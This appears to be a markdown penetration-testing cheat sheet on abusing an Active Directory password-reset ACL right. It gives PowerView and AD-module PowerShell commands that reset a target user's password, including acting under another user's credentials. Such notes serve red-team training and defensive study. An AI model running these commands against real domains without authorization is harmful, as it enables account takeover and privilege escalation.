## Login user with ACL permission PasswordReset
#### Password Reset with Set-DomainUserPassword **PowerView**:
```powershell
Set-DomainUserPassword -Identity <TARGET-USER> -AccountPassword $((ConvertTo-SecureString 'Newpassword1' -AsPlainText -Force)) -Verbose
```
<img width="1838" height="78" alt="Pasted image 20251229171206" src="https://github.com/user-attachments/assets/d7941650-deaf-45ed-9c5f-9d5097e8aa94" />

#### Password Reset with **Active Directory Module**:
```powershell
Set-ADAccountPassword <TARGET-USER> -NewPassword $((ConvertTo-SecureString 'Newpassword1' -AsPlainText -Force)) -Reset -Verbose
```
<img width="1835" height="80" alt="Pasted image 20251229172124" src="https://github.com/user-attachments/assets/5de32df6-f1ca-4c31-9801-6962413bd90d" />


---

## Authenticate as the Controlling User User I have  
   - **Create a Secure String** for the password of the user with ACL permissions (e.g., `ali`):  
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```  
   - **Create a PSCredential Object** to impersonate the controlling user:  
```powershell
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', $SecPassword)
```  
Replace `DOMAIN\USERNAME` (e.g., `corp.com\ali`).

**Define the New Password for the Target User**  
   - **Create a Secure String** for the new password (e.g., `Newpassword1`):  
```powershell
$NewPassword = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
```  

**Reset the Target User's Password**  
   - **Import Required Modules** (e.g., PowerView):  
```powershell
Import-Module .\PowerView.ps1
```  
   - **Execute the Password Change (Must be admin shell)**:  
```powershell
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $NewPassword -Credential $Cred -Verbose
```
Replace `<TARGET_USER>` (e.g., `ahmed`).  



